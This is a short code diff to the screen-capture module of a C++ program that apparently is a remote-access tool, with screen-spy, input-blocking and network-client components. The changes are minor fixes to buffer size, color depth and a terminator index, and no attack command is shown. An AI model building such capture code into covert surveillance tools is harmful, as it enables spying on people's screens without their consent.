@@ -26,9 +26,9 @@ CScreenManager::CScreenManager(IOCPClient* ClientObject, int n):CManager(ClientO
 	m_bIsWorking = TRUE;
 	m_bIsBlockInput = FALSE;
 
-	m_ScreenSpyObject = new CScreenSpy(16);
+	m_ScreenSpyObject = new CScreenSpy(32);
 
-	szBuffer = new char[4 * m_ScreenSpyObject->GetWidth() * m_ScreenSpyObject->GetHeight()];
+	szBuffer = new char[4 * m_ScreenSpyObject->GetWidth() * m_ScreenSpyObject->GetHeight() + 1];
 
 	m_hWorkThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)WorkThreadProc,this,0,NULL);
 }
@@ -231,7 +231,7 @@ VOID CScreenManager::SendFirstScreen()
 	memcpy(szBuffer + 1, FirstScreenData, ulFirstSendLength - 1);
 
 	m_ClientObject->OnServerSending((char*)szBuffer, ulFirstSendLength);
-	szBuffer[ulFirstSendLength] = 0;
+	szBuffer[ulFirstSendLength-1] = 0;
 }
 
 const char* CScreenManager::GetNextScreen(ULONG &ulNextSendLength)
